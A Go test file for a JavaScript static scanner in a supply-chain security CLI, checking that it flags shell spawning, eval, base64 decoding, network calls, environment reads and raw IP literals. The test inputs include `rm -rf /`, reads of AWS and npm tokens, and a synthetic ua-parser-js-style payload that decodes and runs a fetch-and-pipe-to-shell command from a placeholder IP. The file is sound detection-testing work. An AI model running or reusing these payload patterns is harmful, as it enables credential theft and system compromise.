package js

import (
	"testing"

	"github.com/qwexvf/aegis-cli/internal/domain"
	"github.com/qwexvf/aegis-cli/internal/infra/scan/ast"
)

// scan is a one-shot helper: parse src and return Findings.
func scan(t *testing.T, src string) *ast.Findings {
	t.Helper()
	s, err := New()
	if err != nil {
		t.Fatal(err)
	}
	f := ast.NewFindings()
	s.AnalyzeFile("test.js", []byte(src), f)
	return f
}

func has(t *testing.T, f *ast.Findings, c domain.Capability) {
	t.Helper()
	if _, ok := f.Capabilities[c]; !ok {
		t.Errorf("expected %s in findings; got %v", c, f.Capabilities)
	}
}

func notHas(t *testing.T, f *ast.Findings, c domain.Capability) {
	t.Helper()
	if _, ok := f.Capabilities[c]; ok {
		t.Errorf("did NOT expect %s in findings", c)
	}
}

func TestScanner_DetectsShellSpawn(t *testing.T) {
	cases := []string{
		`const cp = require('child_process'); cp.exec('rm -rf /');`,
		`require('child_process').execSync('whoami');`,
		`const { spawn } = require('child_process'); spawn('ls', ['-la']);`,
		`const cp = require('child_process'); cp.spawnSync('node', ['x']);`,
	}
	for i, src := range cases {
		f := scan(t, src)
		if _, ok := f.Capabilities[domain.CapShellSpawn]; !ok {
			t.Errorf("case %d (%q): missing CapShellSpawn", i, src)
		}
	}
}

func TestScanner_DetectsDynamicEval(t *testing.T) {
	for _, src := range []string{
		`eval("alert(1)");`,
		`new Function("return 1")();`,
		`Function("return 1")();`,
	} {
		f := scan(t, src)
		has(t, f, domain.CapDynamicEval)
	}
}

func TestScanner_DetectsBase64Decode(t *testing.T) {
	for _, src := range []string{
		`atob("SGVsbG8=");`,
		`Buffer.from(payload, 'base64');`,
	} {
		f := scan(t, src)
		has(t, f, domain.CapBase64Decode)
	}
}

func TestScanner_DetectsNetEgress(t *testing.T) {
	for _, src := range []string{
		`require('http').get('https://example.com');`,
		`require('https');`,
		`require('net');`,
		`require('dgram');`,
		`const tls = require('tls');`,
		`fetch('https://x.example.com');`,
	} {
		f := scan(t, src)
		has(t, f, domain.CapNetEgress)
	}
}

func TestScanner_DetectsEnvRead(t *testing.T) {
	src := `
		const a = process.env.AWS_ACCESS_KEY_ID;
		const b = process.env["NPM_TOKEN"];
		const c = process.env.NODE_ENV;
	`
	f := scan(t, src)
	has(t, f, domain.CapEnvRead)
	if _, ok := f.EnvReads["AWS_ACCESS_KEY_ID"]; !ok {
		t.Errorf("missing AWS_ACCESS_KEY_ID in env reads: %v", f.EnvReads)
	}
	if _, ok := f.EnvReads["NPM_TOKEN"]; !ok {
		t.Errorf("missing NPM_TOKEN in env reads: %v", f.EnvReads)
	}
	if _, ok := f.EnvReads["NODE_ENV"]; !ok {
		t.Errorf("missing NODE_ENV in env reads: %v", f.EnvReads)
	}
}

func TestScanner_DetectsFSWrite(t *testing.T) {
	src := `const fs = require('fs'); fs.writeFileSync('/tmp/x', 'data');`
	f := scan(t, src)
	has(t, f, domain.CapFSWriteOutsideRoot)
}

func TestScanner_DetectsRawIPLiteral(t *testing.T) {
	src := `const url = "https://203.0.113.1/payload.sh";`
	f := scan(t, src)
	has(t, f, domain.CapRawIPLiteral)
}

func TestScanner_BenignCodeProducesNoFlags(t *testing.T) {
	src := `
		'use strict';
		module.exports = function add(a, b) { return a + b; };
		const greet = (name) => 'hello, ' + name;
	`
	f := scan(t, src)
	if len(f.Capabilities) != 0 {
		t.Errorf("benign code triggered capabilities: %v", f.Capabilities)
	}
}

func TestScanner_UAParserJSStylePayloadDetectsAllSignals(t *testing.T) {
	// Synthetic recreation of the ua-parser-js@0.7.29 payload pattern:
	// postinstall script downloads + decodes + executes.
	src := `
		const { exec } = require('child_process');
		const { writeFileSync } = require('fs');
		const data = atob('Y3VybCAtcyBodHRwOi8vMS4yLjMuNC9wIHwgc2g=');
		writeFileSync('/tmp/p.sh', data);
		exec('/tmp/p.sh');
		const url = 'http://1.2.3.4/c2';
		const tok = process.env.AWS_ACCESS_KEY_ID;
	`
	f := scan(t, src)
	// Note: no CapNetEgress — the source merely assigns a URL string,
	// no actual HTTP call. The raw-IP capture fires for the literal,
	// which is the right signal for "C2-like URL embedded in source".
	for _, want := range []domain.Capability{
		domain.CapShellSpawn,
		domain.CapBase64Decode,
		domain.CapEnvRead,
		domain.CapFSWriteOutsideRoot,
		domain.CapRawIPLiteral,
	} {
		has(t, f, want)
	}
}

func TestScanner_DoesNotFalsePositiveOnMethodNamedExec(t *testing.T) {
	// Bare `.exec(` is RegExp.prototype.exec in real-world JS more often
	// than child_process.exec. The query intentionally drops bare
	// `.exec` (the `require('child_process')` rule still catches the
	// real shape). Make sure neither db.exec nor regex.exec trips.
	for _, src := range []string{
		`class MyDB { exec(sql) { return this.driver.run(sql); } } new MyDB().exec("SELECT 1");`,
		`const RGB_RE = /^rgb\(/; RGB_RE.exec("rgb(0,0,0)");`,
		`const m = /(\d+)/.exec(input.trim());`,
	} {
		f := scan(t, src)
		notHas(t, f, domain.CapShellSpawn)
		notHas(t, f, domain.CapDynamicEval)
	}
}
